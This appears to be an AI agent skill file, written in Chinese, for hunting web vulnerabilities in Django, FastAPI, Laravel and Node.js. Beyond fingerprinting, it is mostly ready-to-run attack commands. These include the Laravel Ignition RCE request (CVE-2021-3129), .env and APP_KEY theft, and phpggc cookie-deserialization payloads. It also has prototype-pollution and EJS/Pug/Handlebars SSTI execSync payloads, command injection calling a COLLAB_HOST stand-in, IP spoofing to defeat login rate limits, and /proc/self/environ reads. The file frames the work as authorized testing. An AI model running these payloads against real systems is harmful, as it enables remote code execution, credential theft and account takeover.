---
name: hunt-frameworks
description: 针对 Django/DRF、FastAPI、Laravel 与 Node.js 的框架特定 Web 漏洞挖掘——权限缺口、批量赋值、SSTI、调试面与原型链污染。当技术栈被指纹识别为其中之一时使用。
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
  tags: [frameworks, django, fastapi, laravel, nodejs, redteam]
  category: redteam
  related_skills:
    - hunt-prototype-pollution
    - hunt-mass-assignment
    - hunt-api-misconfig
    - hunt-idor
    - hunt-rce
    - hunt-ssti
    - hunt-source-leak
---

# 框架特定漏洞挖掘（Django、FastAPI、Laravel、Node.js）

对原 `hunt-django`、`hunt-fastapi`、`hunt-laravel` 与 `hunt-nodejs` 技能的
参数化整合。选择与已指纹识别框架匹配的小节；各小节内的技术内容未做
改动。

## When to Use

- 目标被指纹识别为 Django/DRF（`csrftoken`、`/admin/`、DRF 可浏览 API）、FastAPI（`/docs`、422 `detail` 数组）、Laravel（`XSRF-TOKEN`/`laravel_session` cookie、Ignition 页面）或 Node.js/Express（`X-Powered-By`、EJS/Pug 特征）。
- 你需要框架特定的 sink，而不是通用的 API 测试。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`jq`、`python3`；各小节注明的框架附加工具（Laravel 需要 `phpggc`，gadget 检查需要 Node 运行时）。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（注册、PATCH 循环、上传、命令执行探测），在执行命令前立即获得明确确认。

## How to Run

先做指纹识别，然后跳转到匹配的小节：

```bash
TARGET="https://target.example"
curl --max-time 10 -sI "$TARGET" | grep -iE "x-powered-by|set-cookie|server"
curl --max-time 10 -sk "$TARGET/docs" -o /dev/null -w "fastapi docs: %{http_code}\n"
curl --max-time 10 -sk "$TARGET/admin/login/" -o /dev/null -w "django admin: %{http_code}\n"
curl --max-time 10 -sk "$TARGET/ignition/health-check" -o /dev/null -w "laravel ignition: %{http_code}\n"
```

## Procedure

阅读框架选择表，然后按匹配小节的各阶段执行。每个小节保留自己的陷阱与
验证说明。

| 框架 | 优先挖掘 | 次优先挖掘 |
|---|---|---|
| Django/DRF | 通过无对象权限的 ModelViewSet 实现 IDOR | 通过 `mark_safe` 实现 SSTI |
| FastAPI | 从 OpenAPI 挖掘隐藏路由、依赖注入鉴权缺口 | Pydantic 额外字段批量赋值 |
| Laravel | Ignition 调试 RCE 前置条件、`.env`/`APP_KEY` | Eloquent 批量赋值 |
| Node.js | 原型链污染到 RCE | `trust proxy` IP 伪造、EJS/Pug 中的 SSTI |

---

## Django

挖掘 Django 特有漏洞，重点关注 Django REST Framework（DRF）权限类缺口、ORM 原始查询注入、通过 `|safe` 与 `mark_safe` 实现的模板注入，以及 Django 管理后台利用。Django 的“开箱即用”做法带来了独特的攻击面：管理界面、ORM 查询构建、DRF 序列化器、Channels WebSocket 与 Celery 任务队列。

### 快速检测

```bash
### Django fingerprinting
curl --max-time 30 --connect-timeout 10 -skI "https://target.com/admin/login/" | grep -iE "csrftoken|sessionid|django"
curl --max-time 30 --connect-timeout 10 -sk "https://target.com" | grep -Eo 'csrftoken|__debug__|django'
```

### 陷阱

- **DRF `AllowAny` ≠ 配置错误。** 在报告前先确认该端点本就应当公开。
- **Django 管理后台爆破会被大量记录。** 在生产目标上谨慎使用。
- **模板注入需要 sink。** Django 模板引擎默认自动转义——必须显式使用 `|safe` 或 `mark_safe`。
- **SECRET_KEY 必须是实际泄露的。** 猜测或爆破 SECRET_KEY 在计算上不可行。

### 验证

1. 未使用 `IsAuthenticated` 的 DRF 端点返回了本应受限的数据。
2. ORM 原始查询注入导致数据库报错或数据外泄。
3. Django 管理后台会话 cookie 成功解码，暴露出用户 ID 与会话数据。
4. 模板注入执行了 JavaScript 或读取了服务器文件。

### 相关技能

- **`hunt-sqli`** —— Django ORM 原始查询注入可串联为完整 SQL 注入。
- **`hunt-ssti`** —— 通过用户可控的模板名实现 Django 模板注入。
- **`hunt-idor`** —— DRF 权限缺口导致对象级越权访问。

---

## FastAPI

挖掘 FastAPI 特有漏洞：依赖注入鉴权缺口、Pydantic 模型强制转换与额外字段利用、OpenAPI schema 挖掘隐藏端点，以及 ASGI 中间件绕过。FastAPI 的设计——用依赖注入处理鉴权、用 Pydantic 做校验、自动生成 OpenAPI——带来了有别于 Flask 或 Django 的独特攻击面。

### 快速检测

```bash
### FastAPI fingerprinting
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/openapi.json" | jq '.info.title' 2>/dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/docs" -w "%{http_code}\n" -o /dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/redoc" -w "%{http_code}\n" -o /dev/null
```

### 陷阱

- **Pydantic v2 的 `model_config` 设置 `extra='ignore'` 会静默丢弃未知字段。** 需同时测试 Pydantic v1 与 v2 的行为。
- **OpenAPI schema 可能被限制。** 如果 `/openapi.json` 返回 403，尝试 `/docs` 与 `/redoc`，它们提供相同的数据。
- **FastAPI 中带 `Security` 的 Depends 与 `Depends` 并不相同。** `Security` 会与 OpenAPI 安全方案集成——但两者都可能配置错误。
- **必须启用 Uvicorn 的 `--proxy-headers`，IP 伪造才能生效。** 用 `X-Forwarded-For` 检查——如果服务器看到的是你的真实 IP，说明代理头未启用。

### 验证

1. OpenAPI schema 暴露出未在公开 API 文档中记录的端点。
2. 带有 `Depends(get_current_user)` 的端点在完全不带 Authorization 头时仍接受请求。
3. Pydantic 类型强制转换接受字符串形式的布尔/整数字段并持久化。
4. WebSocket 端点无需会话认证即可建立连接，而对应的 REST 端点要求认证。

### 相关技能

- **`hunt-api-misconfig`** —— 更广泛的 API 配置问题，包括 Swagger/OpenAPI 暴露。
- **`hunt-idor`** —— FastAPI 路径参数中的对象级授权缺口。
- **`source-leak-hunt`** —— 通过 OpenAPI schema 挖掘进行目录与端点发现。

---

## Laravel

### 最高价值目标

生产环境开启 Laravel 调试模式 = 通过 Ignition 立即 RCE（CVE-2021-3129）。

**最高价值的发现：**
- **Ignition RCE（CVE-2021-3129）** —— `APP_DEBUG=true` + Laravel < 8.4.2 → 无需鉴权的 `/_ignition/execute-solution` RCE
- **Telescope 仪表盘** —— `/telescope` 暴露完整的请求/响应日志、DB 查询、Redis 命令、计划任务、环境变量
- **Horizon 仪表盘** —— `/horizon` 暴露队列任务详情、含完整 payload 的失败任务（可能包含 API key、PII）
- **签名 URL 操控** —— 若 `URL::signedRoute` 校验了错误的参数 → 绕过签名 URL → 未授权操作
- **.env 泄露** —— `APP_KEY` 泄露 → 解密所有加密 cookie → 伪造会话 → 账号接管

---

### 阶段 1 —— Laravel 指纹识别

```bash
### Laravel-specific indicators
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "laravel_session\|x-powered-by.*php"
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -i "laravel\|Illuminate\|csrf-token"

### Common Laravel paths
for path in /storage /public /resources "/vendor/laravel" "/.env" "/artisan"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

### Check error page (trigger 404)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
```

---

### 阶段 2 —— 调试模式与 Ignition RCE（CVE-2021-3129）

```bash
### Step 1: Check if debug mode is enabled (Whoops error page)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent" | grep -i "Whoops\|APP_DEBUG\|Ignition"

### If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129

### Step 2: Check Ignition endpoint
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_ignition/health-check" | head -5

### Step 3: CVE-2021-3129 — Laravel < 8.4.2 RCE via log file manipulation
### (Requires debug mode + writable storage/logs)
### Tool: ambionics/laravel-ignition-rce
git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
php /tmp/laravel-rce/exploit.php https://$TARGET "id"

### Manual test — send solution request
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
    }
  }'
```

---

### 阶段 3 —— Laravel Telescope 与 Horizon

```bash
### Telescope — request/response logs, DB queries, jobs, cache, events
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope" | grep -i "telescope\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/requests" | python3 -m json.tool 2>/dev/null | head -50
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/commands" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/redis" | python3 -m json.tool 2>/dev/null | head -30
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/telescope/api/environment" | python3 -m json.tool 2>/dev/null | head -50

### Horizon — queue worker dashboard
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon" | grep -i "horizon\|laravel"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/stats" | python3 -m json.tool 2>/dev/null
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/horizon/api/jobs/failed" | python3 -m json.tool 2>/dev/null | head -50
### Failed job payloads often contain full request data including auth tokens

### Common paths
for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$STATUS" = "200" ] && echo "[+] ACCESSIBLE: $TARGET$path"
done
```

---

### 阶段 4 —— .env 文件与 APP_KEY 泄露

```bash
### Direct .env access
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep -i "APP_KEY\|DB_PASSWORD\|SECRET\|KEY"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.production"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.backup"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env.local"

### If APP_KEY found:
APP_KEY="base64:XXXXXXX"
echo "APP_KEY=$APP_KEY"
### → Can decrypt all Laravel encrypted cookies
### → Can forge session cookies → ATO for any user

### Also check
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
```

---

### 阶段 5 —— 签名 URL 操控

```bash
### Laravel signed URLs contain signature param: ?signature=HASH
### Find signed URL endpoints
cat recon/$TARGET/urls.txt | grep "signature="

### Test: modify a non-signature parameter — should fail validation
SIGNED_URL="https://$TARGET/unsubscribe?user=123&email=test@test.com&signature=VALID_SIG"

### Modify user ID → should fail if properly signed
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/user=123/user=999}"

### Test signature bypass: remove signature entirely
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL/&signature=VALID_SIG/}"

### Test: does the app validate ALL parameters or just some?
curl --max-time 30 --connect-timeout 10 -s "${SIGNED_URL}&extra=malicious"
```

---

### 阶段 6 —— 通过 Eloquent 的批量赋值

```bash
### Laravel Eloquent ORM — if model uses $guarded=[] or $fillable=[] improperly
### Test: add extra fields to update/create requests

### Profile update
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/profile" \
  -H "Cookie: laravel_session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@test.com", "is_admin": true, "role": "admin"}'

### Registration
curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "email": "test@[DOMAIN_EXAMPLE]", "password": "test123", "verified": true, "admin": 1}'
```

---

### 阶段 7 —— Laravel Cookie 反序列化

```bash
### If APP_KEY is known, forge a session cookie with malicious serialized payload
### Uses phpggc gadget chains

### Get the app key
APP_KEY=$(curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.env" | grep "^APP_KEY=" | cut -d= -f2)

### Generate payload with phpggc
php phpggc Laravel/RCE5 system 'id' | base64

### Sign the cookie with the app key using laravel-cookie-forge script
### python3 laravel_cookie_forge.py --key "$APP_KEY" --payload "PHPGGC_PAYLOAD"
```

---

### 利用链表

| Laravel 发现 | 可串联至 | 影响 |
|----------------|----------|--------|
| 调试模式开启 | CVE-2021-3129 Ignition RCE | 严重 RCE |
| Telescope 可访问 | 读取 API key、DB 查询、环境变量 | 高危——凭据窃取 |
| Horizon 可访问 | 读取失败任务 payload | 高危——PII/token 外泄 |
| .env 暴露且含 APP_KEY | 伪造会话 cookie → 账号接管 | 严重账号接管 |
| 签名 URL 绕过 | 未授权操作（如取消任意用户订阅等） | 中高危 |
| 批量赋值 | 设置 is_admin=true → 提权 | 严重 |

---

### 验证
✅ Ignition RCE：响应中返回 `id` 命令输出
✅ Telescope：API 响应中包含带凭据或用户 token 的 DB 查询
✅ APP_KEY：伪造的会话 cookie 被接受，返回其他用户的资料
✅ 批量赋值：`is_admin: true` 被接受，账号现已具有管理员权限

**严重性：**
- Ignition RCE：严重
- Telescope/Horizon 含敏感数据：高危
- .env 含 APP_KEY：严重
- 批量赋值至管理员：严重

---

### 陷阱
- **APP_KEY 暴露但无利用** —— 知道 APP_KEY 即可解密和签名 cookie。需演示伪造的会话 cookie 或解密后的数据。
- **调试模式但无敏感输出** —— `APP_DEBUG=true` 仅显示堆栈跟踪属低危。需要调试输出中出现凭据或密钥。
- **.env 暴露但无数据库凭据** —— 仅含 `APP_NAME=...` 的 `.env` 属信息性发现。需要 DB 凭据、API key 或密钥。
- **Telescope/Horizon 无鉴权** —— 这些工具会暴露队列/缓存/请求数据。需通过这些工具演示对敏感数据的访问。

---

## Node.js

### HUNT-NODEJS —— Node.js 特有漏洞

### 最高价值目标

Node.js 后端中原型链污染到达 sink = 严重 RCE。

**最高价值的利用链：**
- **原型链污染 → RCE** —— 通过 `lodash.merge` / `Object.assign` 注入 `__proto__` → 被污染的原型到达 `child_process.exec` 或 `vm.runInNewContext` sink
- **Express trust proxy** —— 未做校验的 `app.set('trust proxy', true)` → 攻击者设置 `X-Forwarded-For` 绕过 IP 白名单或速率限制
- **EJS/Pug SSTI** —— 模板引擎接收用户输入 → `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` 注入** —— 用户输入被拼接进 shell 命令字符串 → OS 命令注入
- **`require()` 路径穿越** —— 攻击者可控的模块路径 → 将任意文件作为 JS 加载

---

### 攻击面信号

```
X-Powered-By: Express           Confirms Express.js
Node.js in error messages        Runtime detected
package.json exposed             Dependency list + versions
/proc/self/environ accessible    Environment variable exfil
Error stack traces with .js paths  Node.js confirmed
__proto__ in JSON accepted        Prototype pollution candidate
```

---

### 阶段 1 —— 指纹识别

```bash
### Confirm Node.js/Express
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"

### Check for package.json / node_modules exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/package-lock.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/node_modules/.package-lock.json"

### Error-based version detection
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/nonexistent-path-xyz" | grep -i "node\|express\|cannot GET"
```

---

### 阶段 2 —— 原型链污染检测

```bash
### JSON body injection — test if __proto__ is accepted
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

### Constructor prototype
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/settings \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

### URL query param injection (qs library)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/search?__proto__[polluted]=yes&query=test"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/data?constructor[prototype][admin]=1"

### Confirm pollution: does a subsequent request reflect the polluted key?
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
```

---

### 阶段 3 —— 原型链污染 → RCE 利用链

```bash
### If pollution is confirmed, attempt to reach dangerous sinks

### Sink 1: child_process via options.shell pollution
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "NODE_OPTIONS": "--require /proc/self/fd/0",
      "env": {"NODE_OPTIONS": "--inspect=COLLAB_HOST"}
    }
  }'

### Sink 2: lodash template pollution (CVE-2021-23337)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"id\").toString()//"}}'

### Sink 3: ejs template options pollution
### If EJS is used for rendering, pollute the `opts.escapeXML` or `opts.outputFunctionName`
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/template \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl COLLAB_HOST/pp-rce\");x"}}'

### OOB confirmation — check Interactsh for callback
```

---

### 阶段 4 —— Express Trust Proxy 滥用

```bash
### If Express has trust proxy enabled, X-Forwarded-For is trusted
### Test: does spoofed IP bypass IP-based rate limiting or allowlist?

### Spoof IP to 127.0.0.1 (localhost bypass)
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/admin/action \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action": "test"}'

### Spoof to internal IP range
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/internal \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

### Rate limit bypass via rotating fake IPs
for i in $(seq 1 50); do
  curl --max-time 30 --connect-timeout 10 -s https://$TARGET/api/login \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "$i: %{http_code}\n"
done
```

---

### 阶段 5 —— 模板引擎 SSTI（EJS / Pug / Handlebars）

```bash
### EJS SSTI — if user input reaches EJS template context
### Test basic: <%= 7*7 %> should return 49
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}'

### EJS RCE payload
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'

### Pug SSTI
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'

### Handlebars — prototype pollution via template
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
```

---

### 阶段 6 —— child_process 命令注入

```bash
### Look for endpoints that run shell commands with user input
### Signals: /api/convert, /api/exec, /api/ping, /api/scan

### Basic injection test
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/ping?host=127.0.0.1;id"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci"
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command": "ls", "args": ["&&", "curl", "COLLAB_HOST/ci"]}'

### OOB via DNS
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/dns?host=\$(curl+COLLAB_HOST/dns-ci).example.com"
```

---

### 阶段 7 —— /proc/self/environ 外泄

```bash
### If LFI exists on Node.js app, /proc/self/environ leaks env vars
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/environ"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/read?file=../../../../proc/self/environ"

### Also check:
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command-line
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
```

---

### 利用链表

| Node.js 发现 | 可串联至 | 影响 |
|----------------|----------|--------|
| 原型链污染已确认 | 寻找 RCE sink（child_process、eval） | 严重 RCE |
| Express trust proxy | 绕过 IP 白名单 / 速率限制 | 鉴权绕过 / DoS 绕过 |
| 模板引擎中的 SSTI | OS 命令执行 | 严重 RCE |
| child_process 注入 | `id && curl COLLAB_HOST` | 严重 RCE |
| 通过 LFI 读取 /proc/self/environ | `AWS_ACCESS_KEY_ID` 泄露 | 云环境失陷 |

---

### 校验

✅ 原型链污染：未发送的 key 出现在后续 API 响应中
✅ RCE 利用链：收到 OOB 回调，或响应中出现 `id` 输出
✅ Trust proxy：伪造 IP 被接受，绕过速率限制或白名单

**严重性：**
- 原型链污染 → RCE：严重
- SSTI → RCE：严重
- child_process 注入：严重
- Trust proxy → 速率限制绕过：中危
- /proc/self/environ 外泄：高危（若存在云密钥）

### 验证

- 当被污染的 key 在未发送的情况下出现在服务端（参见 `hunt-prototype-pollution`），而非 payload 被反射时，才确认原型链污染。
- 当同一操作从伪造的 `X-Forwarded-For` 被允许、而从真实 IP 被拒绝时，确认 `trust proxy` 伪造。
- 命令执行的结论需要可观测的输出（`id`、OOB 回调），而不是一个 200。

---

### 陷阱
- **原型链污染但无 gadget** —— `__proto__` 注入只是一种原语。需要 gadget 链才能达到 RCE、鉴权绕过或 XSS。
- **使用静态输入的 eval** —— `eval("'use strict'; ...")` 不可利用。需要动态的、用户可控的输入。
- **无用户输入的 child_process** —— 除非命令中包含用户输入，`exec("ls -la")` 不可利用。
- **服务端 JavaScript 注入（SSJI）** —— 与原型链污染不同。应区分这两类攻击。

---

### 相关技能

- **`hunt-api-misconfig`** —— 原型链污染是 API 配置错误与 Node.js 特定 sink 共有的根因类别。利用原语：接受 `__proto__` 的 JSON 合并 → `hunt-api-misconfig` 批量赋值模式（额外的 controller 参数）→ admin 字段污染用户对象。
- **`hunt-rce`** —— 原型链污染若能到达 `child_process` 或 `vm.runInThisContext` 即为 RCE。利用原语：用 `shell:true` 或 `NODE_OPTIONS: "--require /proc/self/fd/0"` 污染 `__proto__` → `child_process.spawn` 使用攻击者可控的 env → 任意命令执行。
- **`hunt-ssti`** —— EJS、Pug 与 Handlebars 的 SSTI 是 Node.js 特有的 RCE 向量。利用原语：模板引擎通过未净化选项的 `render()` 接收用户输入 → `outputFunctionName` 污染（EJS CVE-2022-29078）→ `process.mainModule.require('child_process').execSync('id')`。
- **`hunt-lfi`** —— Node.js 的 LFI 常能到达 `require()` 路径穿越或 `res.sendFile()` sink。利用原语：在 Express 静态文件服务器上请求 `?file=../../../etc/passwd` → 读取配置；`require(userPath)` → 将攻击者可控的 JS 文件作为模块加载 → RCE。
- **`hunt-ssrf`** —— 配置了通配目标的 Express `http-proxy-middleware` 是 Node.js 的 SSRF 向量。利用原语：代理目标被设为用户输入 → 请求被转发到内部服务 → 读取云元数据或内部管理面板。
- **`hunt-brute-force`** —— Express 的 `trust proxy` 配置错误可击穿基于 IP 的速率限制。利用原语：`app.set('trust proxy', true)` + `X-Forwarded-For: 127.0.0.1` → 攻击者通过轮换伪造 IP 绕过登录速率限制。
- **`security-arsenal`** —— 可调用 Node.js 原型链污染 gadget 树（`lodash.merge`、`Object.assign`、`qs.parse`、`express-formidable`、`cookie-parser` 的合并模式）以及 EJS/Pug/Handlebars 的 SSTI payload 包。
- **`triage-validation`** —— 在依据原型链污染声称严重 RCE 之前，先应用 Pre-Severity Gate。`__proto__` 污染只是一种原语——只有当它到达一个将被污染属性解释为命令/env/选项的 sink 时才属严重。在撰写报告前，用 OOB 回调证明该 sink 可达。

---

## Pitfalls

每个框架小节保留自己的陷阱清单；跨框架的共性陷阱为：

- **仅凭单一信号做指纹识别。** `X-Powered-By` 可被伪造或剥离；在加载某个框架小节前，需用两个独立指标（cookie 名称、错误页面、框架特定路径）确认。
- **调试面的存在不等于 RCE。** Whoops/Ignition 页面、`/docs` 与 Django 的 `DEBUG=True` 只是前置条件；各小节的 RCE 步骤会指出额外要求（可写日志路径、启用 eval 的控制台、可达路由）。
- **版本过期的 CVE 结论。** 在报告中引用某个 CVE 前，至少从两个来源确认确切的框架版本。

## Verification

- 框架身份由至少两个独立信号确认。
- 各框架小节自身的验证清单必须通过，其发现才能升级。
- 受授权保护的操作（注册、PATCH 循环、上传、控制台 eval）需用合成对象确认，并在之后清理。

---

## 相关技能

- **`hunt-prototype-pollution`** —— 原型链污染 payload 的权威参考；Node.js 小节仅概述框架层面的 sink。
- **`hunt-mass-assignment`** —— 通用字段注入方法论，由 Laravel/Django/FastAPI 小节按各自 ORM 具体化。
- **`hunt-nextjs`** / **`hunt-nestjs`** —— 针对裸 Node.js 栈之上的 Next.js 与 NestJS 层的框架技能。
